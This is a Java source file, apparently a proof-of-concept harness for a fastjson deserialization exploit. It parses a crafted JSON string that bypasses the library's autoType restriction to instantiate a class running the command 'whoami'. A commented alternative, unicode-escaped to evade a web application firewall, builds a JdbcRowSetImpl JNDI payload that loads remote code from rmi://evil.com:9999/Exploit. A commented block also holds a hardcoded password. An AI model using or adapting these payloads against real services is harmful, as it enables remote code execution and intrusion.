package com.sorry.bug;

import com.alibaba.fastjson.JSON;

import com.fasterxml.jackson.core.JsonFactory;
import com.fasterxml.jackson.core.JsonGenerator;
import com.fasterxml.jackson.databind.ObjectMapper;

import java.io.IOException;
import java.io.StringWriter;
import java.util.HashMap;
import java.util.Map;

/**
 * created by 0x22cb7139 on 2021/6/28
 */
public class Debug {
    public static void main(String[] args) throws IOException {
        //Execute execute = new Execute();
        //execute.setCommand("whoami");
        //String JsonStr = JSON.toJSONString(execute, SerializerFeature.WriteClassName);
        //System.out.println(JsonStr);
        String expStr = "{\"a\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sorry.bug.Execute\"},\"b\":{\"@type\":\"com.sorry.bug.Execute\",\"command\":\"whoami\"}}";
        //绕过autotypesupport限制,unicode16绕waf.
        //String expStr = "{\"\u0061\":{\"\u0040\u0074\u0079\u0070\u0065\":\"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073\",\"\u0076\u0061\u006C\":\"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C\"},\"\u0062\":{\"\u0040\u0074\u0079\u0070\u0065\":\"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C\",\"\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065\":\"\u0072\u006D\u0069\u003A\u002F\u002F\u0065\u0076\u0069\u006C\u002E\u0063\u006F\u006D\u003A\u0039\u0039\u0039\u0039\u002F\u0045\u0078\u0070\u006C\u006F\u0069\u0074\",\"\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074\":\u0074\u0072\u0075\u0065}}";
        JSON.parseObject(expStr);
        /*
        String agentId = "41797";
        String password = "1qaz!QAZ";
        String phoneNum = "89100141";
        boolean isAutoAnswer = true;
        boolean autoenteridle = true;
        Map<String, Object> entityParam = new HashMap<>();
        entityParam.put("password", password);
        entityParam.put("phonenum", phoneNum);
        entityParam.put("autoanswer", Boolean.valueOf(isAutoAnswer));
        entityParam.put("autoenteridle", Boolean.valueOf(autoenteridle));
        entityParam.put("status", Integer.valueOf(4));
        String jsonString = beanToJson(entityParam);
        System.out.println(jsonString);

         */



    }

    public static String beanToJson(Object object) throws IOException {
        ObjectMapper mapper = new ObjectMapper();
        StringWriter writer = new StringWriter();
        JsonGenerator gen = (new JsonFactory()).createJsonGenerator(writer);
        mapper.writeValue(gen, object);
        gen.close();
        String json = writer.toString();
        writer.close();
        return json;
    }
}
